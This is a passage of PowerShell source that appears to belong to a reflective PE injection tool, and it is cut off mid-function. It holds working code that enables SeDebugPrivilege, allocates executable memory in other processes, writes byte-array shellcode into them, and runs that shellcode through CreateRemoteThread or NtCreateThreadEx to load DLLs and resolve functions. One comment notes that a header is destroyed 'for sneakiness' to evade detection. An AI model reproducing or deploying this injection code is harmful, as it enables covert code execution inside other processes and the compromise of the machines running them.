		    [IntPtr]$FinalEndAddress = [IntPtr]::Zero
		    if ($PsCmdlet.ParameterSetName -eq "Size")
		    {
			    [IntPtr]$FinalEndAddress = [IntPtr](Add-SignedIntAsUnsigned ($StartAddress) ($Size))
		    }
		    else
		    {
			    $FinalEndAddress = $EndAddress
		    }
		
		    $PEEndAddress = $PEInfo.EndAddress
		
		    if ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.PEHandle) ($StartAddress)) -eq $true)
		    {
			    Throw "Trying to write to memory smaller than allocated address range. $DebugString"
		    }
		    if ((Compare-Val1GreaterThanVal2AsUInt ($FinalEndAddress) ($PEEndAddress)) -eq $true)
		    {
			    Throw "Trying to write to memory greater than allocated address range. $DebugString"
		    }
	    }
	
	
	    Function Write-BytesToMemory
	    {
		    Param(
			    [Parameter(Position=0, Mandatory = $true)]
			    [Byte[]]
			    $Bytes,
			
			    [Parameter(Position=1, Mandatory = $true)]
			    [IntPtr]
			    $MemoryAddress
		    )
	
		    for ($Offset = 0; $Offset -lt $Bytes.Length; $Offset++)
		    {
			    [System.Runtime.InteropServices.Marshal]::WriteByte($MemoryAddress, $Offset, $Bytes[$Offset])
		    }
	    }
	

	    #Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
	    Function Get-DelegateType
	    {
	        Param
	        (
	            [OutputType([Type])]
	        
	            [Parameter( Position = 0)]
	            [Type[]]
	            $Parameters = (New-Object Type[](0)),
	        
	            [Parameter( Position = 1 )]
	            [Type]
	            $ReturnType = [Void]
	        )

	        $Domain = [AppDomain]::CurrentDomain
	        $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
	        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
	        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
	        $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	        $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
	        $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
	        $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
	        $MethodBuilder.SetImplementationFlags('Runtime, Managed')
	    
	        Write-Output $TypeBuilder.CreateType()
	    }


	    #Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
	    Function Get-ProcAddress
	    {
	        Param
	        (
	            [OutputType([IntPtr])]
	    
	            [Parameter( Position = 0, Mandatory = $True )]
	            [String]
	            $Module,
	        
	            [Parameter( Position = 1, Mandatory = $True )]
	            [String]
	            $Procedure
	        )

	        # Get a reference to System.dll in the GAC
	        $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
	            Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
	        $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
	        # Get a reference to the GetModuleHandle and GetProcAddress methods
	        $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
	        $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')
	        # Get a handle to the module specified
	        $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
	        $tmpPtr = New-Object IntPtr
	        $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)

	        # Return the address of the function
	        Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
	    }
	
	
	    Function Enable-SeDebugPrivilege
	    {
		    Param(
		    [Parameter(Position = 1, Mandatory = $true)]
		    [System.Object]
		    $Win32Functions,
		
		    [Parameter(Position = 2, Mandatory = $true)]
		    [System.Object]
		    $Win32Types,
		
		    [Parameter(Position = 3, Mandatory = $true)]
		    [System.Object]
		    $Win32Constants
		    )
		
		    [IntPtr]$ThreadHandle = $Win32Functions.GetCurrentThread.Invoke()
		    if ($ThreadHandle -eq [IntPtr]::Zero)
		    {
			    Throw "Unable to get the handle to the current thread"
		    }
		
		    [IntPtr]$ThreadToken = [IntPtr]::Zero
		    [Bool]$Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
		    if ($Result -eq $false)
		    {
			    $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			    if ($ErrorCode -eq $Win32Constants.ERROR_NO_TOKEN)
			    {
				    $Result = $Win32Functions.ImpersonateSelf.Invoke(3)
				    if ($Result -eq $false)
				    {
					    Throw "Unable to impersonate self"
				    }
				
				    $Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
				    if ($Result -eq $false)
				    {
					    Throw "Unable to OpenThreadToken."
				    }
			    }
			    else
			    {
				    Throw "Unable to OpenThreadToken. Error code: $ErrorCode"
			    }
		    }
		
		    [IntPtr]$PLuid = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.LUID))
		    $Result = $Win32Functions.LookupPrivilegeValue.Invoke($null, "SeDebugPrivilege", $PLuid)
		    if ($Result -eq $false)
		    {
			    Throw "Unable to call LookupPrivilegeValue"
		    }

		    [UInt32]$TokenPrivSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.TOKEN_PRIVILEGES)
		    [IntPtr]$TokenPrivilegesMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenPrivSize)
		    $TokenPrivileges = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenPrivilegesMem, [Type]$Win32Types.TOKEN_PRIVILEGES)
		    $TokenPrivileges.PrivilegeCount = 1
		    $TokenPrivileges.Privileges.Luid = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PLuid, [Type]$Win32Types.LUID)
		    $TokenPrivileges.Privileges.Attributes = $Win32Constants.SE_PRIVILEGE_ENABLED
		    [System.Runtime.InteropServices.Marshal]::StructureToPtr($TokenPrivileges, $TokenPrivilegesMem, $true)

		    $Result = $Win32Functions.AdjustTokenPrivileges.Invoke($ThreadToken, $false, $TokenPrivilegesMem, $TokenPrivSize, [IntPtr]::Zero, [IntPtr]::Zero)
		    $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() #Need this to get success value or failure value
		    if (($Result -eq $false) -or ($ErrorCode -ne 0))
		    {
			    #Throw "Unable to call AdjustTokenPrivileges. Return value: $Result, Errorcode: $ErrorCode"   #todo need to detect if already set
		    }
		
		    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPrivilegesMem)
	    }
	
	
	    Function Invoke-CreateRemoteThread
	    {
		    Param(
		    [Parameter(Position = 1, Mandatory = $true)]
		    [IntPtr]
		    $ProcessHandle,
		
		    [Parameter(Position = 2, Mandatory = $true)]
		    [IntPtr]
		    $StartAddress,
		
		    [Parameter(Position = 3, Mandatory = $false)]
		    [IntPtr]
		    $ArgumentPtr = [IntPtr]::Zero,
		
		    [Parameter(Position = 4, Mandatory = $true)]
		    [System.Object]
		    $Win32Functions
		    )
		
		    [IntPtr]$RemoteThreadHandle = [IntPtr]::Zero
		
		    $OSVersion = [Environment]::OSVersion.Version
		    #Vista and Win7
		    if (($OSVersion -ge (New-Object 'Version' 6,0)) -and ($OSVersion -lt (New-Object 'Version' 6,2)))
		    {
			    Write-Verbose "Windows Vista/7 detected, using NtCreateThreadEx. Address of thread: $StartAddress"
			    $RetVal= $Win32Functions.NtCreateThreadEx.Invoke([Ref]$RemoteThreadHandle, 0x1FFFFF, [IntPtr]::Zero, $ProcessHandle, $StartAddress, $ArgumentPtr, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero)
			    $LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			    if ($RemoteThreadHandle -eq [IntPtr]::Zero)
			    {
				    Throw "Error in NtCreateThreadEx. Return value: $RetVal. LastError: $LastError"
			    }
		    }
		    #XP/Win8
		    else
		    {
			    Write-Verbose "Windows XP/8 detected, using CreateRemoteThread. Address of thread: $StartAddress"
			    $RemoteThreadHandle = $Win32Functions.CreateRemoteThread.Invoke($ProcessHandle, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, $StartAddress, $ArgumentPtr, 0, [IntPtr]::Zero)
		    }
		
		    if ($RemoteThreadHandle -eq [IntPtr]::Zero)
		    {
			    Write-Verbose "Error creating remote thread, thread handle is null"
		    }
		
		    return $RemoteThreadHandle
	    }

	

	    Function Get-ImageNtHeaders
	    {
		    Param(
		    [Parameter(Position = 0, Mandatory = $true)]
		    [IntPtr]
		    $PEHandle,
		
		    [Parameter(Position = 1, Mandatory = $true)]
		    [System.Object]
		    $Win32Types
		    )
		
		    $NtHeadersInfo = New-Object System.Object
		
		    #Normally would validate DOSHeader here, but we did it before this function was called and then destroyed 'MZ' for sneakiness
		    $dosHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PEHandle, [Type]$Win32Types.IMAGE_DOS_HEADER)

		    #Get IMAGE_NT_HEADERS
		    [IntPtr]$NtHeadersPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEHandle) ([Int64][UInt64]$dosHeader.e_lfanew))
		    $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value $NtHeadersPtr
		    $imageNtHeaders64 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS64)
		
		    #Make sure the IMAGE_NT_HEADERS checks out. If it doesn't, the data structure is invalid. This should never happen.
	        if ($imageNtHeaders64.Signature -ne 0x00004550)
	        {
	            throw "Invalid IMAGE_NT_HEADER signature."
	        }
		
		    if ($imageNtHeaders64.OptionalHeader.Magic -eq 'IMAGE_NT_OPTIONAL_HDR64_MAGIC')
		    {
			    $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders64
			    $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $true
		    }
		    else
		    {
			    $ImageNtHeaders32 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS32)
			    $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders32
			    $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $false
		    }
		
		    return $NtHeadersInfo
	    }


	    #This function will get the information needed to allocated space in memory for the PE
	    Function Get-PEBasicInfo
	    {
		    Param(
		    [Parameter( Position = 0, Mandatory = $true )]
		    [Byte[]]
		    $PEBytes,
		
		    [Parameter(Position = 1, Mandatory = $true)]
		    [System.Object]
		    $Win32Types
		    )
		
		    $PEInfo = New-Object System.Object
		
		    #Write the PE to memory temporarily so I can get information from it. This is not it's final resting spot.
		    [IntPtr]$UnmanagedPEBytes = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PEBytes.Length)
		    [System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $UnmanagedPEBytes, $PEBytes.Length) | Out-Null
		
		    #Get NtHeadersInfo
		    $NtHeadersInfo = Get-ImageNtHeaders -PEHandle $UnmanagedPEBytes -Win32Types $Win32Types
		
		    #Build a structure with the information which will be needed for allocating memory and writing the PE to memory
		    $PEInfo | Add-Member -MemberType NoteProperty -Name 'PE64Bit' -Value ($NtHeadersInfo.PE64Bit)
		    $PEInfo | Add-Member -MemberType NoteProperty -Name 'OriginalImageBase' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.ImageBase)
		    $PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		    $PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfHeaders' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders)
		    $PEInfo | Add-Member -MemberType NoteProperty -Name 'DllCharacteristics' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics)
		
		    #Free the memory allocated above, this isn't where we allocate the PE to memory
		    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($UnmanagedPEBytes)
		
		    return $PEInfo
	    }


	    #PEInfo must contain the following NoteProperties:
	    #	PEHandle: An IntPtr to the address the PE is loaded to in memory
	    Function Get-PEDetailedInfo
	    {
		    Param(
		    [Parameter( Position = 0, Mandatory = $true)]
		    [IntPtr]
		    $PEHandle,
		
		    [Parameter(Position = 1, Mandatory = $true)]
		    [System.Object]
		    $Win32Types,
		
		    [Parameter(Position = 2, Mandatory = $true)]
		    [System.Object]
		    $Win32Constants
		    )
		
		    if ($PEHandle -eq $null -or $PEHandle -eq [IntPtr]::Zero)
		    {
			    throw 'PEHandle is null or IntPtr.Zero'
		    }
		
		    $PEInfo = New-Object System.Object
		
		    #Get NtHeaders information
		    $NtHeadersInfo = Get-ImageNtHeaders -PEHandle $PEHandle -Win32Types $Win32Types
		
		    #Build the PEInfo object
		    $PEInfo | Add-Member -MemberType NoteProperty -Name PEHandle -Value $PEHandle
		    $PEInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ($NtHeadersInfo.IMAGE_NT_HEADERS)
		    $PEInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value ($NtHeadersInfo.NtHeadersPtr)
		    $PEInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value ($NtHeadersInfo.PE64Bit)
		    $PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		
		    if ($PEInfo.PE64Bit -eq $true)
		    {
			    [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS64)))
			    $PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
		    }
		    else
		    {
			    [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS32)))
			    $PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
		    }
		
		    if (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_DLL) -eq $Win32Constants.IMAGE_FILE_DLL)
		    {
			    $PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'DLL'
		    }
		    elseif (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE) -eq $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE)
		    {
			    $PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'EXE'
		    }
		    else
		    {
			    Throw "PE file is not an EXE or DLL"
		    }
		
		    return $PEInfo
	    }
	
	
	    Function Import-DllInRemoteProcess
	    {
		    Param(
		    [Parameter(Position=0, Mandatory=$true)]
		    [IntPtr]
		    $RemoteProcHandle,
		
		    [Parameter(Position=1, Mandatory=$true)]
		    [IntPtr]
		    $ImportDllPathPtr
		    )
		
		    $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		
		    $ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
		    $DllPathSize = [UIntPtr][UInt64]([UInt64]$ImportDllPath.Length + 1)
		    $RImportDllPathPtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		    if ($RImportDllPathPtr -eq [IntPtr]::Zero)
		    {
			    Throw "Unable to allocate memory in the remote process"
		    }

		    [UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
		    $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RImportDllPathPtr, $ImportDllPathPtr, $DllPathSize, [Ref]$NumBytesWritten)
		
		    if ($Success -eq $false)
		    {
			    Throw "Unable to write DLL path to remote process memory"
		    }
		    if ($DllPathSize -ne $NumBytesWritten)
		    {
			    Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
		    }
		
		    $Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
		    $LoadLibraryAAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "LoadLibraryA") #Kernel32 loaded to the same address for all processes
		
		    [IntPtr]$DllAddress = [IntPtr]::Zero
		    #For 64bit DLL's, we can't use just CreateRemoteThread to call LoadLibrary because GetExitCodeThread will only give back a 32bit value, but we need a 64bit address
		    #	Instead, write shellcode while calls LoadLibrary and writes the result to a memory address we specify. Then read from that memory once the thread finishes.
		    if ($PEInfo.PE64Bit -eq $true)
		    {
			    #Allocate memory for the address returned by LoadLibraryA
			    $LoadLibraryARetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			    if ($LoadLibraryARetMem -eq [IntPtr]::Zero)
			    {
				    Throw "Unable to allocate memory in the remote process for the return value of LoadLibraryA"
			    }
			
			
			    #Write Shellcode to the remote process which will call LoadLibraryA (Shellcode: LoadLibraryA.asm)
			    $LoadLibrarySC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			    $LoadLibrarySC2 = @(0x48, 0xba)
			    $LoadLibrarySC3 = @(0xff, 0xd2, 0x48, 0xba)
			    $LoadLibrarySC4 = @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
			
			    $SCLength = $LoadLibrarySC1.Length + $LoadLibrarySC2.Length + $LoadLibrarySC3.Length + $LoadLibrarySC4.Length + ($PtrSize * 3)
			    $SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
			    $SCPSMemOriginal = $SCPSMem
			
			    Write-BytesToMemory -Bytes $LoadLibrarySC1 -MemoryAddress $SCPSMem
			    $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC1.Length)
			    [System.Runtime.InteropServices.Marshal]::StructureToPtr($RImportDllPathPtr, $SCPSMem, $false)
			    $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
			    Write-BytesToMemory -Bytes $LoadLibrarySC2 -MemoryAddress $SCPSMem
			    $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC2.Length)
			    [System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryAAddr, $SCPSMem, $false)
			    $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
			    Write-BytesToMemory -Bytes $LoadLibrarySC3 -MemoryAddress $SCPSMem
			    $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC3.Length)
			    [System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryARetMem, $SCPSMem, $false)
			    $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
			    Write-BytesToMemory -Bytes $LoadLibrarySC4 -MemoryAddress $SCPSMem
			    $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC4.Length)

			
			    $RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			    if ($RSCAddr -eq [IntPtr]::Zero)
			    {
				    Throw "Unable to allocate memory in the remote process for shellcode"
			    }
			
			    $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
			    if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
			    {
				    Throw "Unable to write shellcode to remote process memory."
			    }
			
			    $RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
			    $Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
			    if ($Result -ne 0)
			    {
				    Throw "Call to CreateRemoteThread to call GetProcAddress failed."
			    }
			
			    #The shellcode writes the DLL address to memory in the remote process at address $LoadLibraryARetMem, read this memory
			    [IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
			    $Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $LoadLibraryARetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
			    if ($Result -eq $false)
			    {
				    Throw "Call to ReadProcessMemory failed"
			    }
			    [IntPtr]$DllAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

			    $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $LoadLibraryARetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			    $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		    }
		    else
		    {
			    [IntPtr]$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $LoadLibraryAAddr -ArgumentPtr $RImportDllPathPtr -Win32Functions $Win32Functions
			    $Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
			    if ($Result -ne 0)
			    {
				    Throw "Call to CreateRemoteThread to call GetProcAddress failed."
			    }
			
			    [Int32]$ExitCode = 0
			    $Result = $Win32Functions.GetExitCodeThread.Invoke($RThreadHandle, [Ref]$ExitCode)
			    if (($Result -eq 0) -or ($ExitCode -eq 0))
			    {
				    Throw "Call to GetExitCodeThread failed"
			    }
			
			    [IntPtr]$DllAddress = [IntPtr]$ExitCode
		    }
		
		    $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RImportDllPathPtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		
		    return $DllAddress
	    }
	
	
	    Function Get-RemoteProcAddress
	    {
		    Param(
		    [Parameter(Position=0, Mandatory=$true)]
		    [IntPtr]
		    $RemoteProcHandle,
		
		    [Parameter(Position=1, Mandatory=$true)]
		    [IntPtr]
		    $RemoteDllHandle,
		
		    [Parameter(Position=2, Mandatory=$true)]
		    [String]
		    $FunctionName
		    )

		    $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		    $FunctionNamePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($FunctionName)
		
		    #Write FunctionName to memory (will be used in GetProcAddress)
		    $FunctionNameSize = [UIntPtr][UInt64]([UInt64]$FunctionName.Length + 1)
		    $RFuncNamePtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $FunctionNameSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		    if ($RFuncNamePtr -eq [IntPtr]::Zero)
		    {
			    Throw "Unable to allocate memory in the remote process"
		    }

		    [UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
		    $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RFuncNamePtr, $FunctionNamePtr, $FunctionNameSize, [Ref]$NumBytesWritten)
		    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($FunctionNamePtr)
		    if ($Success -eq $false)
		    {
			    Throw "Unable to write DLL path to remote process memory"
		    }
		    if ($FunctionNameSize -ne $NumBytesWritten)
		    {
			    Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
		    }
		
		    #Get address of GetProcAddress
		    $Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
		    $GetProcAddressAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "GetProcAddress") #Kernel32 loaded to the same address for all processes

		
		    #Allocate memory for the address returned by GetProcAddress
		    $GetProcAddressRetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UInt64][UInt64]$PtrSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		    if ($GetProcAddressRetMem -eq [IntPtr]::Zero)
		    {
			    Throw "Unable to allocate memory in the remote process for the return value of GetProcAddress"
		    }
		
		
		    #Write Shellcode to the remote process which will call GetProcAddress
		    #Shellcode: GetProcAddress.asm
		    #todo: need to have detection for when to get by ordinal
		    [Byte[]]$GetProcAddressSC = @()
		    if ($PEInfo.PE64Bit -eq $true)
		    {
			    $GetProcAddressSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			    $GetProcAddressSC2 = @(0x48, 0xba)
			    $GetProcAddressSC3 = @(0x48, 0xb8)
			    $GetProcAddressSC4 = @(0xff, 0xd0, 0x48, 0xb9)
			    $GetProcAddressSC5 = @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
		    }
		    else
		    {
			    $GetProcAddressSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8)
			    $GetProcAddressSC2 = @(0xb9)
			    $GetProcAddressSC3 = @(0x51, 0x50, 0xb8)
			    $GetProcAddressSC4 = @(0xff, 0xd0, 0xb9)
			    $GetProcAddressSC5 = @(0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3)
		    }
		    $SCLength = $GetProcAddressSC1.Length + $GetProcAddressSC2.Length + $GetProcAddressSC3.Length + $GetProcAddressSC4.Length + $GetProcAddressSC5.Length + ($PtrSize * 4)
		    $SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
		    $SCPSMemOriginal = $SCPSMem
		
		    Write-BytesToMemory -Bytes $GetProcAddressSC1 -MemoryAddress $SCPSMem
		    $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC1.Length)
		    [System.Runtime.InteropServices.Marshal]::StructureToPtr($RemoteDllHandle, $SCPSMem, $false)
		    $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		    Write-BytesToMemory -Bytes $GetProcAddressSC2 -MemoryAddress $SCPSMem
		    $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC2.Length)
		    [System.Runtime.InteropServices.Marshal]::StructureToPtr($RFuncNamePtr, $SCPSMem, $false)
		    $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		    Write-BytesToMemory -Bytes $GetProcAddressSC3 -MemoryAddress $SCPSMem
		    $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC3.Length)
		    [System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressAddr, $SCPSMem, $false)
		    $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		    Write-BytesToMemory -Bytes $GetProcAddressSC4 -MemoryAddress $SCPSMem
		    $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC4.Length)
		    [System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressRetMem, $SCPSMem, $false)
		    $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		    Write-BytesToMemory -Bytes $GetProcAddressSC5 -MemoryAddress $SCPSMem
		    $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC5.Length)
		
		    $RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
		    if ($RSCAddr -eq [IntPtr]::Zero)
		    {
			    Throw "Unable to allocate memory in the remote process for shellcode"
		    }
		
		    $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
		    if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
		    {
			    Throw "Unable to write shellcode to remote process memory."
		    }
		
		    $RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
		    $Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
		    if ($Result -ne 0)
		    {
